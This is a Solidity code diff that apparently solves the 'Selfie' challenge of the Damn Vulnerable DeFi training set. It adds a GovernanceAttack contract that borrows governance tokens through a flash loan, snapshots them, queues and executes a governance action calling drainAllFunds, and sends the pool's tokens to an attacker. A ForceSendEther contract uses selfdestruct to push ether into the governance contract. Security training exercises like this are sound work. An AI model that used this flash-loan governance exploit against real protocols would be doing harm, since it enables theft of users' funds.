@@ -2,8 +2,10 @@
 pragma solidity ^0.8.0;
 
 import "../DamnValuableTokenSnapshot.sol";
-import "@openzeppelin/contracts/utils/Address.sol";
-
+//import "@openzeppelin/contracts/utils/Address.sol";
+import "./Address.sol";
+import "./SelfiePool.sol";
+import "hardhat/console.sol";
 /**
  * @title SimpleGovernance
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -58,7 +60,7 @@ contract SimpleGovernance {
         
         GovernanceAction storage actionToExecute = actions[actionId];
         actionToExecute.executedAt = block.timestamp;
-
+	console.log("Wei Amount of the action: %s", actionToExecute.weiAmount);
         actionToExecute.receiver.functionCallWithValue(
             actionToExecute.data,
             actionToExecute.weiAmount
@@ -89,4 +91,77 @@ contract SimpleGovernance {
         uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
         return balance > halfTotalSupply;
     }
+}
+
+
+
+contract GovernanceAttack {
+    SimpleGovernance public governanceContract;
+    SelfiePool public victimPool;
+    DamnValuableTokenSnapshot public tokenDVT;
+    address payable public attackerAddress;
+    address public myOwnAddress;
+    uint256 public actionId;
+    ForceSendEther public sendEtherByForce ;
+
+    constructor (address _governAddr, address _poolAddr, address _dvtAddr, address _attackerAddr, address _forceAddr ){
+        governanceContract = SimpleGovernance(_governAddr);
+        victimPool = SelfiePool(_poolAddr);
+        tokenDVT = DamnValuableTokenSnapshot(_dvtAddr);
+        attackerAddress = payable(_attackerAddr);
+        myOwnAddress = address(this);
+        sendEtherByForce = ForceSendEther(payable(_forceAddr));
+	console.log("Contract attacker address: %s",address(this));
+    }
+
+    function attackQueue() public {
+        /*victimPool.flashLoan(1);
+        tokenDVT.transfer(address(this),1);
+        tokenDVT.approve(address(this),2**256-1);
+        tokenDVT.transfer(attackerAddress,1);*/
+        tokenDVT.approve(address(this),2**256-1);
+        victimPool.flashLoan(1500000 ether);
+    }
+    function attackExecute() public {
+	address payable _govAddr = payable(address(governanceContract));
+	_govAddr.call{value: 1 ether}("");	
+        console.log("balance of the ATTACKER: %s", address(this).balance);
+	//this.sendTransaction{to: _govAddr, value: 500 gwei}("");
+	//_govAddr.transfer(500 gwei);
+	sendEtherByForce.attackSendEther(_govAddr);
+	console.log("balance of Simple Governance: %s", _govAddr.balance);
+        governanceContract.executeAction(actionId);
+	tokenDVT.transfer(attackerAddress,tokenDVT.balanceOf(address(this)));
+    }
+
+/*    function receiveTokens(address _tokenAddr, uint256 _amount) public {
+        DamnValuableTokenSnapshot localToken = DamnValuableTokenSnapshot(_tokenAddr);
+        //localToken.approve(myOwnAddress,2 ** 256 -1);
+        //localToken.transfer(address(governanceContract),_amount);
+        bytes calldata _callDrain = abi.encodeWithSignature ( "drainAllFunds(address)",address(this));
+        actionId=governanceContract.queueAction(victimPool,_callDrain,_amount);
+        localToken.transfer(address(victimPool), _amount);
+    }*/
+
+    function receiveTokens(address _tokenAddr, uint256 _amount) public {
+        //DamnValuableTokenSnapshot localToken = DamnValuableTokenSnapshot(_tokenAddr);
+        //localToken.approve(myOwnAddress,2 ** 256 -1);
+        //localToken.transfer(address(governanceContract),_amount);
+        //bytes calldata _callDrain = abi.encodeWithSignature ( "drainAllFunds(address)",address(this));
+	tokenDVT.snapshot();
+        actionId=governanceContract.queueAction(address(victimPool),abi.encodeWithSignature ( "drainAllFunds(address)",address(this)),0);
+        tokenDVT.transfer(address(victimPool), _amount);
+    }
+
+    receive() external payable{}
+
+}
+
+contract ForceSendEther {
+
+	function attackSendEther(address payable _addr)public {
+	    selfdestruct(_addr);
+	}
+	receive() external payable{}
+
 }
